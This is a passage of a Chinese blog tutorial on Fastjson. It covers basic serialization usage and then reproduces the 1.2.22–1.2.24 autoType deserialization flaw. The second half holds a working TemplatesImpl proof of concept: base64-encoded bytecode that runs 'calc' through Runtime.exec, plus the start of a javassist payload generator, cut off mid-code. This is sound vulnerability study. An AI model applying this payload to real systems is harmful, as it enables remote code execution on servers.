## 0x00 前言
在前面的RMI和JNDI注入学习里面为本次的Fastjson打了一个比较好的基础。利于后面的漏洞分析。
## 0x01 Fastjson使用
在分析漏洞前，还需要学习一些Fastjson库的简单使用。
### Fastjson概述
FastJson是啊里巴巴的的开源库，用于对JSON格式的数据进行解析和打包。其实简单的来说就是处理json格式的数据的。例如将json转换成一个类。或者是将一个类转换成一段json数据。在我前面的学习系列文章中其实有用到jackson。其作用和Fastjson差不多，都是处理json数据。可参考该篇文章:[Java学习之jackson篇](https://www.cnblogs.com/nice0e3/p/13552644.html)。其实在jackson里面也是存在反序列化漏洞的，这个后面去分析，这里不做赘述。
### Fastjson使用
使用方式：
    //序列化
    String text = JSON.toJSONString(obj); 
    //反序列化
    VO vo = JSON.parse(); //解析为JSONObject类型或者JSONArray类型
    VO vo = JSON.parseObject("{...}"); //JSON文本解析成JSONObject类型
    VO vo = JSON.parseObject("{...}", VO.class); //JSON文本解析成VO.class类
### Fastjson序列化
代码实例：
定义一个实体类
    package com.fastjson.demo;
    public class User {
        private String name;
        private int age;
        public User() {
        }
        @Override
        public String toString() {
            return "User{" +
                    "name='" + name + '\'' +
                    ", age=" + age +
                    '}';
        }
        public String getName() {
            return name;
        }
        public void setName(String name) {
            this.name = name;
        }
        public int getAge() {
            return age;
        }
        public void setAge(int age) {
            this.age = age;
        }
        public User(String name, int age) {
            this.name = name;
            this.age = age;
        }
    }
定义一个test类：
    package com.fastjson.demo;
    import com.alibaba.fastjson.JSON;
    public class test {
        public static void main(String[] args) {
            User user = new User();
            user.setAge(18);
            user.setName("xiaoming");
            String s = JSON.toJSONString(user);
            System.out.println(s);
        }
    }
运行后结果为：
    {"age":18,"name":"xiaoming"}
这是一段标准模式下的序列化成JSON的代码，下面来看另一段。
    package com.fastjson.demo;
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.serializer.SerializerFeature;
    public class test {
        public static void main(String[] args) {
            User user = new User();
            user.setAge(18);
            user.setName("xiaoming");
    //        String s = JSON.toJSONString(user);
    //        System.out.println(s);
            String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
            System.out.println(s1);
        }
    }
执行结果：
    {"@type":"com.fastjson.demo.User","age":18,"name":"xiaoming"}
在和前面代码做对比后，可以发现其实就是在调用`toJSONString`方法的时候，参数里面多了一个`SerializerFeature.WriteClassName`方法。传入`SerializerFeature.WriteClassName`可以使得Fastjson支持自省，开启自省后序列化成`JSON`的数据就会多一个@type，这个是代表对象类型的`JSON`文本。FastJson的漏洞就是他的这一个功能去产生的，在对该JSON数据进行反序列化的时候，会去调用指定类中对于的get/set/is方法，
后面会详细分析。
### Fastjson反序列化
#### 代码实例：
方式一：
    package com.fastjson.demo;
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.serializer.SerializerFeature;
    public class test {
        public static void main(String[] args) {
            User user = new User();
            user.setAge(18);
            user.setName("xiaoming");
            String s = JSON.toJSONString(user);
    //        System.out.println(s);
            User user1 = JSON.parseObject(s, User.class);
            System.out.println(user1);
        }
    }
方式二：
    package com.fastjson.demo;
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.JSONObject;
    import com.alibaba.fastjson.serializer.SerializerFeature;
    public class test {
        public static void main(String[] args) {
            User user = new User();
            user.setAge(18);
            user.setName("xiaoming");
            String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
            JSONObject jsonObject = JSON.parseObject(s1);
            System.out.println(jsonObject);
        }
    }
这种方式返回的是一个`JSONObject`的对象
方式三：
    package com.fastjson.demo;
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.serializer.SerializerFeature;
    public class test {
        public static void main(String[] args) {
            User user = new User();
            user.setAge(18);
            user.setName("xiaoming");
            String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
            User user1 = JSON.parseObject(s1,User.class);
            System.out.println(user1);
        }
    }
执行结果都是一样的
    User{name='xiaoming', age=18}
这三段代码中，可以发现用了`JSON.parseObject`和
`JSON.parse`这两个方法，`JSON.parseObject`方法中没指定对象，返回的则是`JSONObject`的对象。`JSON.parseObject`和
`JSON.parse`这两个方法差不多，`JSON.parseObject`的底层调用的还是`JSON.parse`方法，只是在`JSON.parse`的基础上做了一个封装。
在序列化时，`FastJson`会调用成员对应的`get`方法，被`private`修饰且没有`get`方法的成员不会被序列化，
而反序列化的时候在，会调用了指定类的全部的`setter`，`publibc`修饰的成员全部赋值。可以在实体类的get、set方法中加入打印内容，可自行测试一下。
## 0x02 Fastjson反序列化漏洞复现
漏洞是利用fastjson
autotype在处理json对象的时候，未对@type字段进行完全的安全性验证，攻击者可以传入危险类，并调用危险类连接远程rmi主机，通过其中的恶意类执行代码。攻击者通过这种方式可以实现远程代码执行漏洞的利用，获取服务器的敏感信息泄露，甚至可以利用此漏洞进一步对服务器数据进行修改，增加，删除等操作，对服务器造成巨大的影响。
### 漏洞攻击方式
在Fastjson这个反序列化漏洞中是使用`TemplatesImpl`和`JdbcRowSetImpl`构造恶意代码实现命令执行，`TemplatesImpl`这个类，想必前面调试过这么多链后，对该类也是比较熟悉。他的内部使用的是类加载器，去进行new一个对象，这时候定义的恶意代码在静态代码块中，就会被执行。再来说说后者`JdbcRowSetImpl`是需要利用到前面学习的JNDI注入来实现攻击的。
### 漏洞复现
**漏洞版本** ：fastjson 1.22-1.24
利用链：TemplatesImpl
这里做一个简单的demo
构造恶意类：
    package nice0e3;
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.parser.Feature;
    import com.alibaba.fastjson.parser.ParserConfig;
    public class fj_poc {
        public static void main(String[] args) {
            ParserConfig config = new ParserConfig();
            String text = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ }}";
            Object obj = JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);
        }
    }
执行成功，`_bytecodes`对应的数据里面可以看到是Base64编码的数据，这数据其实是下面这段代码，编译后进行base64加密后的数据。
    import com.sun.org.apache.xalan.internal.xsltc.DOM;
    import com.sun.org.apache.xalan.internal.xsltc.TransletException;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
    import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
    import java.io.IOException;
    public class Test extends AbstractTranslet {
        public Test() throws IOException {
            Runtime.getRuntime().exec("calc");
        }
        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
        }
        @Override
        public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {
        }
        public static void main(String[] args) throws Exception {
            Test t = new Test();
        }
    }
但是在使用运用中个人觉得更倾向于这个poc
    package com.nice0e3;
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.parser.Feature;
    import com.alibaba.fastjson.parser.ParserConfig;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import javassist.ClassPool;
    import javassist.CtClass;
    import org.apache.commons.net.util.Base64;
    public class gadget {
            public static class test{
            }
            public static void main(String[] args) throws Exception {
                ClassPool pool = ClassPool.getDefault();
                CtClass cc = pool.get(test.class.getName());
                String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
                cc.makeClassInitializer().insertBefore(cmd);
                String randomClassName = "nice0e3"+System.nanoTime();